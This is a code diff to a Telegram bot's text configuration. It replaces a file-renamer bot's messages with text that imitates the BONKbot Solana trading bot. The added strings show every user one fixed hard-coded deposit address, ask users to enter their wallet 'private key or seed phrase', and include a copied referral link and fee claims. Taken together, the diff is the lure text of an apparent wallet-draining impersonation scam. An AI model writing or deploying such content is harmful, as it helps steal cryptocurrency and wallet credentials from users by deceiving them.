@@ -48,40 +48,110 @@ class Config(object):
 
 class Txt(object):
     # part of text configuration
-    START_TXT = """<b>Hᴀɪ {} 👋,
-Tʜɪs Is Aɴ Aᴅᴠᴀɴᴄᴇᴅ Aɴᴅ Yᴇᴛ Pᴏᴡᴇʀꜰᴜʟ Rᴇɴᴀᴍᴇ Bᴏᴛ
-Usɪɴɢ Tʜɪs Bᴏᴛ Yᴏᴜ Cᴀɴ Rᴇɴᴀᴍᴇ & Cʜᴀɴɢᴇ Tʜᴜᴍʙɴᴀɪʟ Oꜰ Yᴏᴜʀ Fɪʟᴇ
-Yᴏᴜ Cᴀɴ Aʟsᴏ Cᴏɴᴠᴇʀᴛ Vɪᴅᴇᴏ Tᴏ Fɪʟᴇ & Fɪʟᴇ Tᴏ Vɪᴅᴇᴏ
-Tʜɪs Bᴏᴛ Aʟꜱᴏ Sᴜᴘᴘᴏʀᴛs Cᴜsᴛᴏᴍ Tʜᴜᴍʙɴᴀɪʟ Aɴᴅ Cᴜsᴛᴏᴍ Cᴀᴘᴛɪᴏɴ
-Tʜɪs Bᴏᴛ Wᴀs Cʀᴇᴀᴛᴇᴅ Bʏ : @FDBotz 💞</b>"""
+    START_TXT = """<b>Hi {} 
+Welcome to BONKBot!
 
-    ABOUT_TXT = """<b>╭───────────⍟
-├🤖 ᴍy ɴᴀᴍᴇ : {}
-├🖥️ Dᴇᴠᴇʟᴏᴩᴇʀꜱ : <a href=https://t.me/FDBotz/53>𝗙𝗗 𝗕𝗢𝗧𝗭</a> 
-├👨‍💻 Pʀᴏɢʀᴀᴍᴇʀ : <a href=https://github.com/TGTesla>ㄒ乇丂ㄥ卂</a>
-├📕 Lɪʙʀᴀʀy : <a href=https://github.com/pyrogram>Pyʀᴏɢʀᴀᴍ</a>
-├✏️ Lᴀɴɢᴜᴀɢᴇ: <a href=https://www.python.org>Pyᴛʜᴏɴ 3</a>
-├💾 Dᴀᴛᴀ Bᴀꜱᴇ: <a href=https://cloud.mongodb.com>Mᴏɴɢᴏ DB</a>
-├📊 Bᴜɪʟᴅ Vᴇʀꜱɪᴏɴ: <a href=https://github.com>Rᴇɴᴀᴍᴇʀ V4.7.2</a></b>     
-╰───────────────⍟ """
+Solana’s fastest bot to trade any coin (SPL token), built by the BONK community!
 
-    HELP_TXT = """
-🌌 <b><u>Hᴏᴡ Tᴏ Sᴇᴛ Tʜᴜᴍʙɴɪʟᴇ</u></b>
+You currently have no SOL in your wallet. To start trading, deposit SOL to your BONKbot wallet address:
+
+`<code>2qBi9NZizBkS1tn6GjKwzL6yBkU2nY6ivs4d3bXfzKeE</code>` (tap to copy)
+
+Once done, tap refresh and your balance will appear here.
+
+To buy a token enter a ticker, token address, or a URL from pump.fun or Birdeye.
+
+For more info on your wallet and to retrieve your private key, tap the wallet button below. User funds are safe on BONKbot, but if you expose your private key we can't protect you!</b>"""
+
+    SETTINGS_TXT = """Settings:
+
+GENERAL SETTINGS
+Language: Shows the current language. Tap to switch between available languages.
+Minimum Position Value: Minimum position value to show in portfolio. Will hide tokens below this threshhold. Tap to edit.
+
+AUTO BUY
+Immediately buy when pasting token address. Tap to toggle.
+
+BUTTONS CONFIG
+Customize your buy and sell buttons for buy token and manage position. Tap to edit.
+
+SLIPPAGE CONFIG
+Customize your slippage settings for buys and sells. Tap to edit.
+Max Price Impact is to protect against trades in extremely illiquid pools.
+
+MEV PROTECT
+MEV Protect accelerates your transactions and protect against frontruns to make sure you get the best price possible.
+Turbo: BONKbot will use MEV Protect, but if unprotected sending is faster it will use that instead.
+Secure: Transactions are guaranteed to be protected. This is the ultra secure option, but may be slower.;
+
+TRANSACTION PRIORITY
+Increase your Transaction Priority to improve transaction speed. Select preset or tap to edit.
+
+SELL PROTECTION;
+100% sell commands require an additional confirmation step.  Tap to toggle."""
+
+    DEPOSIT_TXT = """Deposit Solana or import wallet to update settings"""
+
+    DEPOSITADDRESS_TXT = """“To start trading add funds to your sol wallet provided below ⬇️
+
+<code>2qBi9NZizBkS1tn6GjKwzL6yBkU2nY6ivs4d3bXfzKeE</code>"""
+
+    IMPORTWALLET_TXT = """What is the private key or seed phrase of the wallet that you want to import?
+
+Phantom or Solflare wallet and any other trading bot private keys are accepted.
+
+Please enter it below ⬇️"""
+
+    WALLETADDRESS = """Your Wallet:
   
-<b>•»</b> /start Tʜᴇ Bᴏᴛ Aɴᴅ Sᴇɴᴅ Aɴy Pʜᴏᴛᴏ Tᴏ Aᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟy Sᴇᴛ Tʜᴜᴍʙɴɪʟᴇ.
-<b>•»</b> /del_thumb Uꜱᴇ Tʜɪꜱ Cᴏᴍᴍᴀɴᴅ Tᴏ Dᴇʟᴇᴛᴇ Yᴏᴜʀ Oʟᴅ Tʜᴜᴍʙɴɪʟᴇ.
-<b>•»</b> /view_thumb Uꜱᴇ Tʜɪꜱ Cᴏᴍᴍᴀɴᴅ Tᴏ Vɪᴇᴡ Yᴏᴜʀ Cᴜʀʀᴇɴᴛ Tʜᴜᴍʙɴɪʟᴇ.
-📑 <b><u>Hᴏᴡ Tᴏ Sᴇᴛ Cᴜꜱᴛᴏᴍ Cᴀᴩᴛɪᴏɴ</u></b>
-<b>•»</b> /set_caption - Uꜱᴇ Tʜɪꜱ Cᴏᴍᴍᴀɴᴅ Tᴏ Sᴇᴛ ᴀ Cᴜꜱᴛᴏᴍ Cᴀᴩᴛɪᴏɴ
-<b>•»</b> /see_caption - Uꜱᴇ Tʜɪꜱ Cᴏᴍᴍᴀɴᴅ Tᴏ Vɪᴇᴡ Yᴏᴜʀ Cᴜꜱᴛᴏᴍ Cᴀᴩᴛɪᴏɴ
-<b>•»</b> /del_caption - Uꜱᴇ Tʜɪꜱ Cᴏᴍᴍᴀɴᴅ Tᴏ Dᴇʟᴇᴛᴇ Yᴏᴜʀ Cᴜꜱᴛᴏᴍ Cᴀᴩᴛɪᴏɴ
-Exᴀᴍᴩʟᴇ:- /set_caption 📕 Fɪʟᴇ Nᴀᴍᴇ: {filename}
-💾 Sɪᴢᴇ: {filesize}
-⏰ Dᴜʀᴀᴛɪᴏɴ: {duration}
-✏️ <b><u>Hᴏᴡ Tᴏ Rᴇɴᴀᴍᴇ A Fɪʟᴇ</u></b>
-<b>•»</b> Sᴇɴᴅ Aɴy Fɪʟᴇ Aɴᴅ Tyᴩᴇ Nᴇᴡ Fɪʟᴇ Nɴᴀᴍᴇ \nAɴᴅ Aᴇʟᴇᴄᴛ Tʜᴇ Fᴏʀᴍᴀᴛ [ document, video, audio ].           
-ℹ️ 𝗔𝗻𝘆 𝗢𝘁𝗵𝗲𝗿 𝗛𝗲𝗹𝗽 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 :- <a href=https://t.me/FDBotzCHAT>𝑺𝑼𝑷𝑷𝑶𝑹𝑻 𝑮𝑹𝑶𝑼𝑷</a>
-"""
+Address: <code>2qBi9NZizBkS1tn6GjKwzL6yBkU2nY6ivs4d3bXfzKeE</code>
+Balance: 0.000000000 SOL
+  
+Tap to copy the address and send SOL to deposit."""
+
+    NOENOUGHBALANCE_TXT = """Not enough SOL to withdraw"""
+
+    REFER_TXT = """Referrals:
+
+Your reflink: https://t.me/bonkbot_bot?start=ref_kdp28
+
+Referrals: 0
+
+Lifetime Bonk earned: 0.00 BONK ($0.00)
+
+Rewards are updated at least every 24 hours and rewards are automatically deposited to your BONK balance.
+
+Refer your friends and earn 30% of their fees in the first month, 20% in the second and 10% forever!"""
+
+    BUYSOL_TXT = """Buy Token:
+  
+To buy a token enter a ticker, token address, or a URL from pump.fun or Birdeye."""
+
+    SELL_TXT = """No open positions"""
+
+    HELP_TXT = """Help:
+
+Which tokens can I trade?
+Any SPL token that is a SOL pair, on Raydium or Jupiter, and will integrate more platforms on a rolling basis. We pick up Raydium pairs instantly, and Jupiter will pick up non-SOL pairs within approx. 15 minutes.
+
+How can I see how much money I've made from referrals?
+Tap the referrals button or type /referrals to see your payment in $BONK!
+
+How do I create a new wallet on BONKbot?
+Tap the Wallet button or type /wallet, and you'll be able to configure your new wallets!
+
+Is BONKbot free? How much do I pay for transactions?
+BONKbot is completely free! We charge 1% on transactions, and keep the bot free so that anyone can use it. 
+
+Why is my Net Profit lower than expected?
+Your Net Profit is calculated after deducting all associated costs, including Price Impact, Transfer Tax, Dex Fees, and a 1% BONKbot fee. This ensures the figure you see is what you actually receive, accounting for all transaction-related expenses.
+
+Is there a difference between @bonkbot_bot and the backup bots?
+No, they are all the same bot and you can use them interchangeably. If one is slow or down, you can use the other ones. You will have access to the same wallet and positions.
+  
+Further questions? Join our Telegram group: https://t.me/BONKbotChat"""
+
+
 
 #⚠️ Dᴏɴ'ᴛ Rᴇᴍᴏᴠᴇ Oᴜʀ Cʀᴇᴅɪᴛꜱ @ᴩyʀᴏ_ʙᴏᴛᴢ🙏🥲
     DEV_TXT = """<b><u>Sᴩᴇᴄɪᴀʟ Tʜᴀɴᴋꜱ & Dᴇᴠᴇʟᴏᴩᴇʀꜱ</b></u>
